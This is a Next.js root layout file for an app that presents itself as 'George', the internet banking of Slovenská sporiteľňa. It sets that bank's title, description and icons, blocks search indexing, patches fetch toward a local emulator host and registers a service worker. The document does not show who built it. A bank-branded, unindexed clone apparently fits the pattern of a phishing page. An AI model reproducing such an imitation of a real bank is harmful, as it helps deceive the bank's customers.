import { Inter } from 'next/font/google'
import type { Metadata, Viewport } from 'next'
import Script from 'next/script'
import './globals.css'
import { cookies } from 'next/headers'
import { getDictionary, Locale } from '@/lib/i18n'
import { TranslationProvider } from '@/components/providers/translation-provider'

const inter = Inter({
  subsets: ['latin', 'latin-ext'],
  weight: ['400', '500', '600', '700', '800', '900'],
  display: 'swap',
  variable: '--font-inter',
})
export const viewport: Viewport = {
  width: 'device-width',
  initialScale: 1,
  maximumScale: 1,
  userScalable: false,
  themeColor: '#091b3f',
}

export const metadata: Metadata = {
  title: 'George – nový Internetbanking – Slovenská sporiteľňa, a.s.',
  description: 'Prihláste sa do nového Internetbankingu Slovenskej sporiteľne. S Georgeom bankujete jednoduchšie a s väčším prehľadom.',
  generator: 'v0.app',
  applicationName: 'George',
  robots: {
    index: false,
    follow: false,
    googleBot: {
      index: false,
      follow: false,
    },
  },
  appleWebApp: {
    capable: true,
    statusBarStyle: 'black-translucent',
    title: 'George',
  },
  formatDetection: {
    telephone: false,
  },
  manifest: '/manifest.json',
  icons: {
    icon: [
      { url: '/favicon-32x32.png', sizes: '32x32', type: 'image/png' },
      { url: '/favicon-16x16.png', sizes: '16x16', type: 'image/png' }
    ],
    apple: [
      { url: '/apple-touch-icon.png', sizes: '180x180', type: 'image/png' }
    ],
    shortcut: '/favicon.ico',
  },
}

export default async function RootLayout({
  children,
}: Readonly<{
  children: React.ReactNode
}>) {
  const cookieStore = await cookies()
  const localeCookie = cookieStore.get('NEXT_LOCALE')
  const locale = (localeCookie?.value === 'en' ? 'en' : 'sk') as Locale
  const dictionary = getDictionary(locale)

  return (
    <html lang={locale} className={inter.variable} suppressHydrationWarning>
      <head>
        <meta name="apple-mobile-web-app-capable" content="yes" />
        <Script id="capacitor-fetch-redirect" strategy="beforeInteractive">
          {`
            if (typeof window !== 'undefined') {
              // Ak bežíme v Capacitor prostredí, presmerujeme relatívne fetch na host server
              if (window.Capacitor || navigator.userAgent.includes('Capacitor')) {
                var originalFetch = window.fetch;
                window.fetch = function (input, init) {
                  if (typeof input === 'string' && input.startsWith('/')) {
                    input = 'http://10.0.2.2:3030' + input;
                  }
                  return originalFetch(input, init);
                };
              }
            }
          `}
        </Script>
      </head>
      <body className="font-sans antialiased" suppressHydrationWarning>
        <TranslationProvider dictionary={dictionary} locale={locale}>
          {children}
        </TranslationProvider>
        <Script id="pwa-service-worker" strategy="lazyOnload">
          {`
            if ('serviceWorker' in navigator) {
              window.addEventListener('load', async () => {
                try {
                  const reg = await navigator.serviceWorker.register('/service-worker.js');
                  console.log('[PWA] Service Worker registered, scope:', reg.scope);
                  reg.addEventListener('updatefound', () => {
                    const newWorker = reg.installing;
                    if (newWorker) {
                      newWorker.addEventListener('statechange', () => {
                        if (newWorker.state === 'activated') {
                          console.log('[PWA] New Service Worker activated');
                        }
                      });
                    }
                  });
                } catch (err) {
                  console.error('[PWA] Service Worker registration failed:', err);
                }
              });
            }
          `}
        </Script>
      </body>
    </html>
  )
}
